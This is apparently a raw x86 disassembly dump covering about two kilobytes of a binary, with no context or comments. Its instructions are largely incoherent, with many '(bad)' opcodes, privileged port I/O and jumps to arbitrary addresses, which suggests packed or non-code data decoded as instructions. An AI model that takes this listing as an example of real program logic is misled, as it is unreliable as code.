  4222ec:	outs   dx,BYTE PTR ds:[esi]
  4222ed:	addr16 sbb esp,esp
  4222f0:	add    eax,0xfed95120
  4222f5:	or     DWORD PTR [ebp+0x3e],ebx
  4222f8:	or     eax,0x5bf2ea1d
  4222fd:	js     0x422280
  4222ff:	(bad)  
  422300:	push   esp
  422301:	test   al,0x58
  422304:	shr    BYTE PTR [eax+0x68474098],1
  42230a:	rol    BYTE PTR [edx+0x50cb4c8e],cl
  422310:	ret    0xcb4e
  422313:	popa   
  422314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422315:	cmp    DWORD PTR [esi-0x1e],ecx
  422318:	sub    DWORD PTR [ecx-0x6c],ebp
  42231b:	inc    esp
  42231c:	push   ebp
  42231d:	(bad)  [esi]
  42231f:	mov    edi,esp
  422321:	fdivr  QWORD PTR [ecx+ecx*8-0x3b]
  422325:	out    0x6a,eax
  422327:	xor    BYTE PTR [ecx+edi*1],dh
  42232a:	dec    eax
  42232b:	lods   eax,DWORD PTR ds:[esi]
  42232c:	add    al,0x8d
  42232e:	out    0x7f,al
  422330:	(bad)  
  422331:	outs   dx,DWORD PTR ds:[esi]
  422332:	pushf  
  422333:	daa    
  422334:	xlat   BYTE PTR ds:[ebx]
  422335:	(bad)  
  422336:	in     al,dx
  422337:	jp     0x422321
  422339:	shl    BYTE PTR [ecx+0x2b],1
  42233c:	mov    WORD PTR [edi+0x6e],?
  42233f:	adc    ebp,ecx
  422341:	inc    ebp
  422342:	xchg   ecx,eax
  422343:	cmp    al,BYTE PTR [ecx]
  422345:	daa    
  422346:	lods   al,BYTE PTR ds:[esi]
  422347:	mov    dl,0xe
  422349:	jg     0x422370
  42234b:	js     0x42237c
  42234d:	rol    BYTE PTR [ebp+0x2e],0x58
  422351:	ss inc ebx
  422353:	cmp    DWORD PTR [ebx-0x40],esp
  422356:	icebp  
  422357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422358:	xchg   esp,eax
  422359:	jnp    0x422388
  42235b:	(bad)  
  42235c:	fs ret 
  42235e:	cdq    
  42235f:	jnp    0x42239d
  422361:	in     al,0x42
  422363:	cs retfw 0xe992
  422368:	dec    esi
  422369:	jmpw   0x82ab
  42236d:	xchg   edx,eax
  42236e:	out    0xcd,eax
  422370:	(bad)  
  422371:	lods   al,BYTE PTR ds:[esi]
  422372:	fcomp  QWORD PTR [eax+0x79432a66]
  422378:	imul   eax,DWORD PTR [ebx+0x3c8e1817],0x43
  42237f:	(bad)  
  422380:	faddp  st(1),st
  422382:	outs   dx,BYTE PTR ds:[esi]
  422383:	sbb    eax,edx
  422385:	enter  0x9c59,0x44
  422389:	mov    esp,ds
  42238b:	mov    edx,0x6b77f624
  422390:	dec    edi
  422391:	jns    0x42233b
  422393:	jo     0x42233d
  422395:	push   es
  422396:	test   eax,0xf8915398
  42239b:	repnz add al,0x1
  42239e:	push   es
  42239f:	int3   
  4223a0:	imul   ebx,DWORD PTR [edx-0x207c0655],0x26c8db71
  4223aa:	and    al,0xbf
  4223ac:	jp     0x422381
  4223ae:	pop    ebp
  4223af:	(bad)  
  4223b0:	adc    dl,ch
  4223b2:	or     ebx,ebx
  4223b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223b5:	adc    DWORD PTR [esi],eax
  4223b7:	sar    BYTE PTR ds:0x7d84ea30,1
  4223bd:	push   edx
  4223be:	cld    
  4223bf:	cmp    BYTE PTR [ebx],0x84
  4223c2:	out    dx,eax
  4223c3:	lods   eax,DWORD PTR ds:[esi]
  4223c4:	fs in  eax,dx
  4223c6:	pop    eax
  4223c7:	int    0x9c
  4223c9:	jg     0x422397
  4223cb:	test   al,0xb9
  4223cd:	and    DWORD PTR ds:0x39a9fbaa,ecx
  4223d3:	icebp  
  4223d4:	jecxz  0x4223ea
  4223d6:	xchg   esi,eax
  4223d7:	lds    edi,FWORD PTR [ecx-0x40]
  4223da:	mov    dl,0x7a
  4223dc:	xor    ebx,DWORD PTR ds:0x3603e86f
  4223e2:	shl    BYTE PTR [eax],0xcf
  4223e5:	mov    ebp,0x36508ba
  4223ea:	adc    eax,0x4948893b
  4223ef:	jmp    0x42240f
  4223f1:	ds xchg ebx,eax
  4223f3:	add    BYTE PTR [ebp-0x27],cl
  4223f6:	inc    edx
  4223f7:	or     al,0x51
  4223f9:	(bad)  
  4223fa:	push   edx
  4223fb:	sub    DWORD PTR [ebx+0x7bccd0f9],0xcd2f6816
  422405:	xor    al,0xa1
  422407:	and    edx,DWORD PTR [ecx-0xc49e4a7]
  42240d:	mov    esi,0xd3aa7729
  422412:	xchg   edx,eax
  422413:	icebp  
  422414:	dec    ebp
  422415:	jno    0x42243c
  422417:	out    dx,eax
  422418:	js     0x42240b
  42241a:	and    ah,0x83
  42241d:	stos   BYTE PTR es:[edi],al
  42241e:	adc    ebp,DWORD PTR [ebp+0x502f9eb]
  422424:	mov    esi,?
  422426:	stc    
  422427:	mov    ebp,0xfe4c9b37
  42242c:	mov    dh,0x94
  42242e:	(bad)  
  42242f:	mov    ecx,0x2ae41591
  422434:	xchg   bl,bl
  422436:	add    al,0x45
  422438:	sub    ecx,eax
  42243a:	call   0x697dbd58
  42243f:	push   ds
  422440:	dec    edx
  422441:	xor    eax,0x47757a89
  422446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422447:	cmp    dl,al
  422449:	xchg   esp,eax
  42244a:	push   esp
  42244b:	js     0x422497
  42244d:	and    eax,0x65070abe
  422452:	sbb    al,0x31
  422454:	dec    ecx
  422455:	aas    
  422456:	out    dx,al
  422457:	dec    esp
  422458:	xor    DWORD PTR [eax+0x6631df92],0x5a5b64b2
  422462:	mov    edx,DWORD PTR [ecx]
  422464:	test   BYTE PTR [edi],bl
  422466:	inc    ebp
  422467:	ficom  WORD PTR [esi+0x43]
  42246a:	fwait
  42246b:	or     BYTE PTR ds:0xdcc06838,0x37
  422472:	ror    BYTE PTR [ebp-0x3956c4b4],0xa
  422479:	into   
  42247a:	in     eax,0x3b
  42247c:	nop
  42247d:	push   edx
  42247e:	mulps  xmm2,XMMWORD PTR [ebp+0x2e]
  422482:	and    al,al
  422484:	adc    eax,0xd6978e47
  422489:	and    eax,0x5d485a8c
  42248e:	jae    0x422415
  422490:	mov    cs,WORD PTR [ecx-0x52c450e8]
  422496:	fst    QWORD PTR [edi+0x53313e0b]
  42249c:	xchg   edx,eax
  42249d:	psadbw mm6,mm7
  4224a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a1:	ror    dh,0xda
  4224a4:	retf   0xa49b
  4224a7:	sub    BYTE PTR [ebp+0x16],0x19
  4224ab:	xor    edx,DWORD PTR [ecx]
  4224ad:	fxch   st(4)
  4224af:	push   ebx
  4224b0:	pop    ds
  4224b1:	adc    dl,BYTE PTR [ebx+0x786b458]
  4224b7:	inc    edi
  4224b8:	dec    esi
  4224b9:	unpckhps xmm3,xmm6
  4224bc:	comiss xmm7,DWORD PTR [ebp-0x51]
  4224c0:	xchg   ebp,eax
  4224c1:	in     al,dx
  4224c2:	jl     0x4224ec
  4224c4:	fs inc ecx
  4224c6:	mov    ch,0x5e
  4224c8:	xchg   edx,eax
  4224c9:	mov    edi,0x3f8c112
  4224ce:	iret   
  4224cf:	cmp    edx,eax
  4224d1:	jb     0x42249a
  4224d3:	popf   
  4224d4:	inc    ebx
  4224d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224d6:	mov    dl,0xae
  4224d8:	jge    0x42251b
  4224da:	mov    edi,esp
  4224dc:	inc    edi
  4224dd:	sbb    ch,BYTE PTR [eax+0x1a]
  4224e0:	mov    ecx,0x749a6b9
  4224e5:	mov    esp,0xc2aae4cd
  4224ea:	mov    ch,0xb5
  4224ec:	aaa    
  4224ed:	mov    WORD PTR [ecx+0x77],gs
  4224f0:	mov    ds:0x1730a0d3,eax
  4224f5:	mov    edx,0xeeede90a
  4224fa:	sub    DWORD PTR [ebp-0x26dbb8d1],ebp
  422500:	sbb    ah,dh
  422502:	call   0xfdf61613
  422507:	mov    eax,ds:0x63ba2ac6
  42250c:	push   ss
  42250d:	(bad)  
  42250e:	fwait
  42250f:	cmp    BYTE PTR [edx+0xa53ae32],0xf3
  422516:	mov    ch,0x15
  422518:	mov    ebp,0xd47cb143
  42251d:	out    dx,eax
  42251e:	push   ecx
  42251f:	aas    
  422520:	inc    ecx
  422521:	jecxz  0x422560
  422523:	fnstcw WORD PTR [esi]
  422525:	sub    ah,ch
  422527:	fs ja  0x4224c0
  42252a:	mov    dh,0xed
  42252c:	out    0x18,eax
  42252e:	push   ebx
  42252f:	pop    edx
  422530:	add    dl,dl
  422532:	scas   eax,DWORD PTR es:[edi]
  422533:	punpcklwd mm6,DWORD PTR [ecx+ebp*2-0xc]
  422538:	dec    ecx
  422539:	repnz and eax,0x14739d89
  42253f:	ins    BYTE PTR es:[edi],dx
  422540:	inc    ebx
  422541:	sbb    al,dl
  422543:	and    eax,0xd99c2f84
  422548:	dec    esi
  422549:	and    al,0xe8
  42254b:	inc    eax
  42254c:	cmp    DWORD PTR [ecx+0x10],esi
  42254f:	loop   0x422508
  422551:	out    dx,al
  422552:	mov    al,0x78
  422554:	dec    ebx
  422555:	imul   eax,DWORD PTR [esi-0x5f],0x30
  422559:	ret    
  42255a:	aaa    
  42255b:	push   0xffffffe5
  42255d:	jnp    0x4225b6
  42255f:	lock jge 0x42253f
  422562:	movlps QWORD PTR [ecx],xmm6
  422565:	(bad)  
  422566:	fld    TBYTE PTR [ecx+0x57]
  422569:	scas   al,BYTE PTR es:[edi]
  42256a:	add    DWORD PTR [edx],ecx
  42256c:	imul   ebx,DWORD PTR [edx-0x52db1ea5],0xffffffe3
  422573:	aaa    
  422574:	xchg   DWORD PTR [esi-0x56],edx
  422577:	jb     0x42250e
  422579:	rol    BYTE PTR ds:0x1dcf5254,cl
  42257f:	inc    ebp
  422580:	cdq    
  422581:	or     eax,DWORD PTR [ecx]
  422583:	jl     0x422583
  422585:	sbb    eax,DWORD PTR [edi]
  422587:	aas    
  422588:	aaa    
  422589:	out    0xec,eax
  42258b:	xor    al,0xb2
  42258d:	call   0xd728:0x81a335a
  422594:	mov    edx,0xd2681087
  422599:	jl     0x82b62766
  42259f:	jne    0x422577
  4225a1:	sub    BYTE PTR [ebx+0x3f],dl
  4225a4:	xchg   ecx,eax
  4225a5:	shrd   DWORD PTR [ebx+0x45dac83f],esp,0x68
  4225ad:	mov    ah,0xb5
  4225af:	or     esi,DWORD PTR [bx+di+0x6b]
  4225b3:	xor    eax,0xb1a1bb28
  4225b8:	add    eax,0xe9f3df62
  4225bd:	dec    ecx
  4225be:	out    dx,al
  4225bf:	daa    
  4225c0:	pop    es
  4225c1:	and    BYTE PTR [edx+eax*4+0x3f2d10c7],al
  4225c8:	mov    ecx,DWORD PTR [esi+0x6254d337]
  4225ce:	scas   eax,DWORD PTR es:[edi]
  4225cf:	dec    BYTE PTR [ebx-0x17d03dee]
  4225d5:	ja     0x4225d9
  4225d7:	inc    edi
  4225d8:	repnz test ecx,0x7fa6358c
  4225df:	xor    al,0xc1
  4225e1:	les    eax,FWORD PTR [eax-0x333643a7]
  4225e7:	sub    eax,0x1e8aa60c
  4225ec:	fiadd  DWORD PTR [eax+0x6ca81daf]
  4225f2:	iret   
  4225f3:	out    0x29,al
  4225f5:	sbb    DWORD PTR [esi+0x57],ebp
  4225f8:	mov    ebp,0x114e1cb
  4225fd:	mov    edx,0x18e82beb
  422602:	sub    DWORD PTR [ebx-0x2f],esp
  422605:	dec    esi
  422606:	push   esi
  422607:	mul    DWORD PTR [ebx+0x4f726094]
  42260d:	jnp    0x4225a4
  42260f:	push   cs
  422610:	add    ecx,0xffffffe1
  422613:	test   eax,0x583b95bf
  422618:	adc    DWORD PTR [ebx+0x31],eax
  42261b:	cmp    DWORD PTR [edx],esp
  42261d:	jmp    FWORD PTR [esi-0x6ca05a3a]
  422623:	std    
  422624:	stos   BYTE PTR es:[edi],al
  422625:	or     al,0x8f
  422627:	push   esp
  422628:	cmc    
  422629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42262a:	xchg   ebx,eax
  42262b:	sbb    ah,cl
  42262d:	mov    edi,0x9e79b650
  422632:	push   ds
  422633:	add    eax,0x7c84fd64
  422638:	push   edi
  422639:	popa   
  42263a:	and    edi,DWORD PTR [edx-0x2c3eb7f1]
  422640:	inc    eax
  422641:	jmp    0x7ca25826
  422646:	in     eax,dx
  422647:	jmp    0x7b6f8eab
  42264c:	xchg   BYTE PTR [esi],dh
  42264e:	inc    esp
  42264f:	mov    al,0x9
  422651:	fbstp  TBYTE PTR [eax+ecx*8]
  422654:	add    DWORD PTR [esi-0x399adf23],esi
  42265a:	mov    bh,0x8e
  42265c:	xor    ebx,esi
  42265e:	push   eax
  42265f:	fist   DWORD PTR [edx-0x55]
  422662:	jge    0x42261a
  422664:	in     eax,0x4f
  422666:	pusha  
  422667:	add    DWORD PTR [eax+0x38019b42],eax
  42266d:	add    bh,BYTE PTR [edi]
  42266f:	mov    edi,0x28ceed29
  422674:	add    eax,0x324650ff
  422679:	push   DWORD PTR [ebp+ecx*4-0x2b]
  42267d:	lods   al,BYTE PTR ds:[esi]
  42267e:	lahf   
  42267f:	add    DWORD PTR [ecx-0x67],edx
  422682:	xor    al,0xb3
  422684:	mov    edx,0x1f4609c4
  422689:	ja     0x422690
  42268b:	and    BYTE PTR [esi],0x32
  42268e:	js     0x422669
  422690:	or     esi,DWORD PTR [ecx-0x7f]
  422693:	fsqrt  
  422695:	xchg   esi,eax
  422696:	push   es
  422697:	xor    ch,BYTE PTR [edx]
  422699:	test   DWORD PTR [eax],edi
  42269b:	or     al,BYTE PTR [edi-0x27]
  42269e:	cwde   
  42269f:	adc    eax,DWORD PTR [edx+0x57a4f409]
  4226a5:	mov    ds:0x3187e185,eax
  4226aa:	cmp    bh,ch
  4226ac:	mov    ah,0xe1
  4226ae:	loop   0x4226a6
  4226b0:	xlat   BYTE PTR ds:[ebx]
  4226b1:	cmc    
  4226b2:	add    BYTE PTR [ebp-0x4841ea47],0xcf
  4226b9:	jecxz  0x422652
  4226bb:	cmc    
  4226bc:	push   ss
  4226bd:	pusha  
  4226be:	icebp  
  4226bf:	or     al,0xe3
  4226c1:	loope  0x422666
  4226c3:	sahf   
  4226c4:	add    DWORD PTR [eax+0x42b02a7b],edx
  4226ca:	cmp    BYTE PTR [esi],dl
  4226cc:	nop
  4226cd:	mov    eax,ds:0x85463e5b
  4226d2:	clc    
  4226d3:	mov    al,0xba
  4226d5:	push   eax
  4226d6:	dec    edi
  4226d7:	mov    dl,bl
  4226d9:	fmul   st(3),st
  4226db:	out    dx,eax
  4226dc:	test   DWORD PTR [edx-0x46],0x8c9fd7
  4226e3:	xor    dl,BYTE PTR [ecx+edx*8+0x69f8b229]
  4226ea:	ret    
  4226eb:	pop    ebx
  4226ec:	leave  
  4226ed:	outs   dx,DWORD PTR ds:[esi]
  4226ee:	call   FWORD PTR [ecx-0x1a0fd7f6]
  4226f4:	dec    edx
  4226f5:	xor    al,dh
  4226f7:	fs lahf 
  4226f9:	loopne 0x42276d
  4226fb:	aas    
  4226fc:	or     esi,esi
  4226fe:	lgs    ebp,FWORD PTR [eax+esi*4-0x7f64932]
  422706:	mov    ebp,0xd08beee4
  42270b:	daa    
  42270c:	mov    ebx,0x43a6dd38
  422711:	or     ebp,DWORD PTR [eax+eiz*8+0x37]
  422715:	mov    edx,0xe887f12f
  42271a:	lods   al,BYTE PTR ds:[esi]
  42271b:	xlat   BYTE PTR ds:[ebx]
  42271c:	xchg   edx,eax
  42271d:	mov    ah,0x82
  42271f:	xor    dl,cl
  422721:	(bad)  
  422722:	js     0x422766
  422724:	jl     0x4226e1
  422726:	jge    0x4226c2
  422728:	xlat   BYTE PTR ds:[ebx]
  422729:	xchg   edi,eax
  42272a:	test   DWORD PTR [eax-0x67],edi
  42272d:	mov    WORD PTR [ebx-0xe8b93b8],fs
  422733:	(bad)  
  422734:	punpckhdq mm7,QWORD PTR [ecx+0x64]
  422738:	js     0x4226e6
  42273a:	dec    eax
  42273b:	std    
  42273c:	and    BYTE PTR [esi+0xeedf93c],bl
  422742:	cmp    al,0xe5
  422744:	pop    ecx
  422745:	(bad)  
  422746:	mov    ebp,0x91697e90
  42274b:	jmp    0xc1dbd93a
  422750:	mov    ds:0xfacf874,al
  422755:	leave  
  422756:	cmp    ah,BYTE PTR [edi+eiz*2-0x15]
  42275a:	jno    0x4226e5
  42275c:	lahf   
  42275d:	xchg   esp,eax
  42275e:	add    ch,ch
  422760:	sub    ebp,edi
  422762:	adc    DWORD PTR ds:0xb4adf4da,esi
  422768:	mov    dh,BYTE PTR [ebx+eax*8-0xa]
  42276c:	push   edi
  42276d:	inc    ebx
  42276e:	leave  
  42276f:	dec    eax
  422770:	(bad)  
  422771:	idiv   BYTE PTR [edx-0x79]
  422774:	and    BYTE PTR [ecx+0x25740160],0xbb
  42277b:	addr16 mov bh,0x3c
  42277e:	jmp    0x422733
  422780:	xlat   BYTE PTR ds:[ebx]
  422781:	jmp    0xd93bf623
  422786:	es aam 0xa6
  422789:	mov    eax,0x400e853
  42278e:	enter  0xeae7,0xb3
  422792:	enter  0x5024,0x2c
  422796:	dec    ebx
  422797:	mov    cl,bh
  422799:	add    DWORD PTR [esi+edx*4],0x60
  42279d:	jns    0x42281e
  42279f:	shr    BYTE PTR [edx-0x7393edc9],0xcb
  4227a6:	fsub   st(5),st
  4227a8:	inc    edx
  4227a9:	je     0x42282a
  4227ab:	retf   0x9b29
  4227ae:	jmp    0x422741
  4227b0:	cmc    
  4227b1:	push   ebx
  4227b2:	pop    esi
  4227b3:	clc    
  4227b4:	jl     0x422828
  4227b6:	loopne 0x4227ad
  4227b8:	jp     0x4227e4
  4227ba:	mov    ds:0x10270836,eax
  4227bf:	pop    edx
  4227c0:	or     BYTE PTR [edx-0x5c52e711],dl
  4227c6:	push   cs
  4227c7:	in     eax,dx
  4227c8:	jecxz  0x422796
  4227ca:	xchg   esi,eax
  4227cb:	inc    edi
  4227cc:	and    dl,bh
  4227ce:	xchg   esi,eax
  4227cf:	pop    edx
  4227d0:	sbb    al,0xd1
  4227d2:	sahf   
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	and    DWORD PTR [ebx],ecx
  4227d6:	and    ebx,DWORD PTR [edi-0x55]
  4227d9:	inc    edx
  4227da:	inc    ebp
  4227db:	pop    esi
  4227dc:	jge    0x422854
  4227de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227df:	inc    esi
  4227e0:	fmul   st(1),st
  4227e2:	sbb    ch,BYTE PTR [edi]
  4227e4:	mov    WORD PTR [eax-0x7f],gs
  4227e7:	push   cs
  4227e8:	mov    bh,0xaf
  4227ea:	xchg   ebp,eax
  4227eb:	xchg   DWORD PTR [eax+edi*4],ebx
  4227ee:	adc    al,0x1a
  4227f0:	jge    0x4227a6
  4227f2:	retf   0xf3c9
  4227f5:	fdiv   DWORD PTR [eax-0xf6d55d5]
  4227fb:	push   cs
  4227fc:	iret   
  4227fd:	les    edx,FWORD PTR [edi+0x4a406255]
  422803:	sbb    BYTE PTR [ecx+ebp*8],cl
  422806:	inc    ebp
  422807:	adc    al,0x9
  422809:	add    al,0xcb
  42280b:	in     eax,dx
  42280c:	sub    ebx,DWORD PTR [edi-0x13]
  42280f:	adc    BYTE PTR [edx],bh
  422811:	stos   WORD PTR es:[edi],ax
  422813:	lods   eax,DWORD PTR ds:[esi]
  422814:	outs   dx,DWORD PTR ds:[esi]
  422815:	ret    
  422816:	push   0x49
  422818:	cmp    BYTE PTR [edx+0x41a27ad7],cl
  42281e:	add    BYTE PTR [ebx],cl
  422820:	ja     0x4227bd
  422822:	pop    ecx
  422823:	xchg   esp,eax
  422824:	imul   ecx,DWORD PTR [ebx],0xffffffb9
  422827:	jmp    0xf1d:0x9f4d9093
  42282e:	nop
  42282f:	(bad)  
  422830:	jno    0x422842
  422832:	in     eax,0x52
  422834:	pop    esi
  422835:	add    al,0xbc
  422837:	sahf   
  422838:	inc    ebp
  422839:	jl     0x4227d6
  42283b:	out    dx,al
  42283c:	cmp    eax,0x2704cda0
  422841:	mov    edi,0x620cbf46
  422846:	shl    esp,1
  422848:	mov    ecx,ebp
  42284a:	loopne 0x422875
  42284c:	mov    eax,0x94aa74f4
  422851:	xchg   edx,eax
  422852:	mov    ebx,0xfecd2687
  422857:	pop    ebp
  422858:	test   BYTE PTR [edx],bl
  42285a:	mov    ds:0x125d7ddf,al
  42285f:	sub    DWORD PTR [ebp-0xeba959e],edi
  422865:	shl    BYTE PTR [eax+0x2e],cl
  422868:	test   DWORD PTR [ebx+0x54],esi
  42286b:	pushf  
  42286c:	xchg   ecx,eax
  42286d:	and    al,0x45
  42286f:	lock xchg edi,eax
  422871:	in     eax,dx
  422872:	pop    edi
  422873:	inc    edi
  422874:	mov    eax,0xaa46edee
  422879:	sar    DWORD PTR [esi],0x81
  42287c:	jne    0x422896
  42287e:	jmp    0x4228b5
  422880:	push   edx
  422881:	xchg   DWORD PTR [edx],esp
  422883:	loope  0x42281d
  422885:	ds aaa 
  422887:	jle    0x42287e
  422889:	sbb    edx,esi
  42288b:	cmp    ah,dh
  42288d:	sbb    DWORD PTR [ecx+0x6d],0xffffffa5
  422891:	pop    eax
  422892:	popa   
  422893:	mov    ebp,0x88f60073
  422898:	jnp    0x4228d7
  42289a:	add    esi,DWORD PTR [esi]
  42289c:	(bad)  
  42289e:	pop    esp
  42289f:	inc    edi
  4228a0:	dec    ecx
  4228a1:	inc    esp
  4228a2:	retf   
  4228a3:	xor    cl,dl
  4228a5:	popf   
  4228a6:	adc    ch,BYTE PTR [edi]
  4228a8:	neg    BYTE PTR [edi+0x6e]
  4228ab:	xor    dl,BYTE PTR [ecx-0x66e08470]
  4228b1:	mov    esi,0x2181b1d7
  4228b6:	pop    es
  4228b7:	inc    edi
  4228b8:	jecxz  0x42291c
  4228ba:	mov    al,0xfc
  4228bc:	push   0x4f2f519c
  4228c1:	ftst   
  4228c3:	sbb    BYTE PTR [ecx+0x68],dh
  4228c6:	fucomip st,st(6)
  4228c8:	lock dec esp
  4228ca:	into   
  4228cb:	ret    0x1172
  4228ce:	(bad)  [edx+0x16a7919d]
  4228d4:	sub    ch,BYTE PTR [eax]
  4228d6:	inc    esp
  4228d7:	mov    ebp,0x850f342
  4228dc:	or     BYTE PTR [ebp+0x42],cl
  4228df:	cmp    al,0xc4
  4228e1:	or     eax,0x4045575e
  4228e6:	sbb    al,0xc4
  4228e8:	jecxz  0x4228f2
  4228ea:	pop    ecx
  4228eb:	mov    BYTE PTR [edx],bl
  4228ed:	in     eax,0xdc
  4228ef:	cld    
  4228f0:	pop    ecx
  4228f1:	cs inc edi
  4228f3:	dec    ebx
  4228f4:	(bad)  
  4228f5:	sub    DWORD PTR [ebx+0x7f842048],0x8e3058ad
  4228ff:	mov    al,0x90
  422901:	push   esp
  422902:	cmc    
  422903:	pop    ecx
  422904:	popf   
  422905:	test   DWORD PTR [edi+0x5a],edx
  422908:	dec    ebx
  422909:	and    ebx,DWORD PTR [edx+0x1d3d4f62]
  42290f:	sub    eax,0xaa7fe782
  422914:	push   ebp
  422915:	(bad)  [ebx]
  422917:	clc    
  422918:	in     eax,0x1a
  42291a:	xor    ah,BYTE PTR [eax]
  42291c:	mov    edi,0x95f93906
  422921:	sub    ecx,ebx
  422923:	das    
  422924:	nop
  422925:	and    eax,DWORD PTR ds:0x6b0c75ac
  42292b:	scas   al,BYTE PTR es:[di]
  42292d:	adc    al,0xec
  42292f:	daa    
  422930:	sbb    ebx,DWORD PTR [eax-0x49f0c47b]
  422936:	jns    0x422939
  422938:	adc    BYTE PTR [esi],ch
  42293a:	and    al,0xf2
  42293c:	mov    bh,0xb3
  42293e:	and    bl,dl
  422940:	xchg   ebx,eax
  422941:	imul   ebp,DWORD PTR [ebx+0x188d7c72],0xffffffa8
  422948:	jmp    0x422923
  42294a:	mov    esp,0xc9589b9f
  42294f:	mov    DWORD PTR [ecx-0x14],esi
  422952:	lods   al,BYTE PTR ds:[esi]
  422953:	xor    eax,0xa8701b71
  422958:	and    DWORD PTR [eax+0x21],ebx
  42295b:	loop   0x42293e
  42295d:	xchg   edx,eax
  42295e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42295f:	inc    eax
  422960:	mov    ds:0x8978ee80,eax
  422965:	xor    al,0xaf
  422967:	ret    0xc98a
  42296a:	mov    bl,0x3a
  42296c:	int3   
  42296d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296e:	xchg   ebx,eax
  42296f:	rep stos BYTE PTR es:[edi],al
  422971:	bound  esp,QWORD PTR [eax]
  422973:	cmp    DWORD PTR [ebx+0x1f543ac3],ebp
  422979:	push   ebp
  42297a:	gs pop ebp
  42297c:	add    eax,0x7d817323
  422981:	les    ebx,FWORD PTR [edi]
  422983:	push   edi
  422984:	jg     0x422a04
  422986:	das    
  422987:	fidivr WORD PTR [ebx]
  422989:	adc    DWORD PTR [edx],esi
  42298b:	scas   eax,DWORD PTR es:[edi]
  42298c:	add    DWORD PTR [esi+0x24],ebx
  42298f:	(bad)  
  422990:	sbb    eax,0x834ece3e
  422995:	jne    0x4229de
  422997:	sbb    BYTE PTR [edx+0x20],ch
  42299a:	shl    ebx,0x39
  42299d:	scas   al,BYTE PTR es:[edi]
  42299e:	pop    ss
  42299f:	mov    bl,0x65
  4229a1:	(bad)  
  4229a3:	pop    esi
  4229a4:	in     al,0x7d
  4229a6:	mov    dh,al
  4229a8:	mov    dl,0xfc
  4229aa:	loopne 0x4229ce
  4229ac:	aam    0xd7
  4229ae:	xor    al,0x6d
  4229b0:	inc    ebp
  4229b1:	xor    dl,cl
  4229b3:	jmp    0x4229d8
  4229b5:	mov    edi,0x352d9b2e
  4229ba:	mov    edx,0x30690c17
  4229bf:	push   eax
  4229c0:	sbb    BYTE PTR [edx],cl
  4229c2:	mov    dl,0x4
  4229c4:	sbb    al,0xb0
  4229c6:	mov    ds:0x44b30775,al
  4229cb:	lahf   
  4229cc:	inc    ebp
  4229cd:	imul   ebp,DWORD PTR [edi+ebp*4],0xabfebf93
  4229d4:	push   eax
  4229d5:	xchg   DWORD PTR [bp+si+0x1c9c],ecx
  4229da:	or     dh,BYTE PTR [ecx+0x20]
  4229dd:	test   al,0xcf
  4229df:	mov    eax,0x708a9ce9
  4229e4:	jmp    0x4229b0
  4229e6:	add    bl,cl
  4229e8:	push   0xffffff97
  4229ea:	loopne 0x42297c
  4229ec:	mov    edx,ebp
  4229ee:	add    esp,DWORD PTR [ecx+0x72e7b2aa]
  4229f4:	sbb    al,0x4b
  4229f6:	sbb    al,0x34
  4229f8:	imul   esi,esp,0x68
  4229fb:	jns    0x4229a4
  4229fd:	sbb    al,0x73
  4229ff:	mov    DWORD PTR [eax-0x11119360],esp
  422a05:	test   eax,0x47fd5107
  422a0a:	xor    DWORD PTR [ebp+0x4b69e8c8],esi
  422a10:	(bad)  
  422a11:	adc    ecx,DWORD PTR [edx+ecx*8+0xf]
  422a15:	inc    edx
  422a16:	jmp    0x4bce:0xc766b481
  422a1d:	sub    BYTE PTR [ecx-0x371eddb2],ch
  422a23:	(bad)  
  422a24:	aas    
  422a25:	and    bl,dl
  422a27:	lahf   
  422a28:	mov    bh,0x11
  422a2a:	fild   QWORD PTR [edx-0x1]
  422a2d:	mov    eax,0xc3b356e7
  422a32:	mov    cl,0x67
  422a34:	push   ecx
  422a35:	ror    BYTE PTR [ebp-0x65b12ac2],1
  422a3b:	mov    eax,0xf3971f01
  422a40:	add    BYTE PTR [edi+0x5a],bh
  422a43:	adc    DWORD PTR ds:0xf0869079,esi
  422a49:	mov    esi,0x718f431d
  422a4e:	push   ebp
  422a4f:	add    ch,ah
  422a51:	mov    edx,0x1c6bfe94
  422a56:	mov    BYTE PTR [eax],dl
  422a58:	inc    eax
  422a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a5a:	or     ah,BYTE PTR [edx+ebx*8+0x70]
  422a5e:	mov    esp,0x4a8d3de2
  422a63:	mov    ebx,0x41931c2a
  422a68:	inc    edx
  422a69:	mov    ebx,0xda04354e
  422a6e:	jmp    0x422ae9
  422a70:	outs   dx,DWORD PTR ds:[esi]
  422a71:	iret   
  422a72:	call   0xb8024b49
  422a77:	in     al,0x2e
  422a79:	push   0x8d112f8f
  422a7e:	sbb    ah,cl
  422a80:	mov    al,0xd8
  422a82:	jo     0x422ab2
  422a84:	mov    esi,0x24ff652a
  422a89:	jle    0x422a46
  422a8b:	lds    edi,FWORD PTR ds:0x46fea3be
  422a91:	xor    BYTE PTR [edi+eiz*2+0x1aae5d96],al
  422a98:	leave  
  422a99:	cdq    
  422a9a:	xor    DWORD PTR ds:0x40ba27bc,0x6dda4766
  422aa4:	pop    ss
  422aa5:	sti    
  422aa6:	cmp    eax,0xe6ce4831
  422aab:	into   
  422aac:	mov    al,ds:0x324e3cdd
  422ab1:	repz pop edi
  422ab3:	outs   dx,BYTE PTR ds:[esi]
  422ab4:	adc    al,0x42
  422ab6:	jbe    0x422a56
  422ab8:	cmp    eax,0xf3bbfa82
  422abd:	sti    
  422abe:	fstp   DWORD PTR [ebx+esi*1-0x40]
  422ac2:	fisttp QWORD PTR [esi]
  422ac4:	jmp    0x76e706e4
  422ac9:	nop
  422aca:	mov    ebx,0x85776158
  422acf:	push   ss
  422ad0:	mov    ds:0x4de70e01,eax
  422ad5:	sbb    ebp,DWORD PTR [ecx-0x36b978b8]
  422adb:	es sbb eax,0x97f2e3ae
  422ae1:	jl     0x422aec
  422ae3:	in     al,0xe5
